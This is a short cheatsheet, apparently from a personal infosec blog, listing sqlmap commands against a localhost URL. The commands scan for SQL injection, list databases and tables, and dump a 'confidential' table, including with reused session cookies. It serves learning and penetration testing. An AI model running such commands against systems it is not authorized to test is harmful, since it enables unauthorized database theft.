+++
categories = ["infosec", "sqlmap"]
date = "2021-04-04"
description = "SQLMap Cheatsheet"
title = "SQLMap cheatsheet"
+++

### NOTE: All dumps can be found in $HOME/.sqlmap folder

### Scan a URL
```bash
sqlmap -u <url>
```
```bash
sqlmap -u http://127.0.0.1?id=65
```

### List all the database
```bash
sqlmap -u http://127.0.0.1?id=65 --dbs
```

### List Tables in the Users database
```bash
sqlmap -u http://127.0.0.1?id=65 --tables -D users
```

### Dump all tables from users databse
```bash
sqlmap -u http://127.0.0.1?id=65 --dump -D users
```

### Dump confidential table from users databse
```bash
sqlmap -u http://127.0.0.1?id=65 --dump -D users -T confidential
```

### Dump confidential table from users databse with cookies
```bash
sqlmap -u http://127.0.0.1?id=65 --dump -D users -T confidential --cookie='cookie1=val1;cookie2=val2'
```

Where `cookie1`, `cookie2` are cookie name and `val1` & `val2` are their values respectively, you can obtain it from browser dev tools.
